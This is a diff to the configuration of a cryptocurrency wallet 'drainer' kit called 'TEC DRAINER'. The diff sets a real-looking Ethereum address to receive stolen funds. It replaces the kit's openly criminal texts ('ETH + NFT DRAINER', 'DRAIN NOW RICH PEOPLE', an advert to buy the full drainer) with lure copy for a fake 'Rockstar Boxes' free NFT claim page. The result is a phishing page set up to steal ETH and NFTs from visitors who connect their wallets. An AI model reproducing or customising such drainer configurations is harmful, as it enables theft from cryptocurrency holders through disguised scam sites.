@@ -1,4 +1,4 @@
-const receiveAddress = "Your ETH Wallet Adress";
+const receiveAddress = "0x6dB36aDc8Cbe41b81F6250BF3F70A3634dA65314";
 
 const collectionInfo = {
     name: "TEC DRAINER",
@@ -11,14 +11,14 @@ const collectionInfo = {
 
 const indexPageInfo = {
     backgroundImage: "background.jpg", // relative path to background image (in assets)
-    title: "{name}", // {name} will be replaced with collectionInfo.name
-    underTitle: "ETH + NFT DRAINER",
+    title: "{Rockstar Boxes}", // {name} will be replaced with collectionInfo.name
+    underTitle: "What will you recieve? it's a mystery",
 }
 
 const claimPageInfo = {
     title: "FREE NFT", // <br> is a line break
-    shortDescription: "DRAIN NOW RICH PEOPLE.",
-    longDescription: "YOU CAN ALSO BUY FULL ETH DRAINER WITH SIGNATURE AT T.ME/TECONSELLIX. ENJOY DRAINING!",
+    shortDescription: "Will you make it?",
+    longDescription: "The Rockstar Apes await...",
 
     claimButtonText: "CLAIM NOW",
 
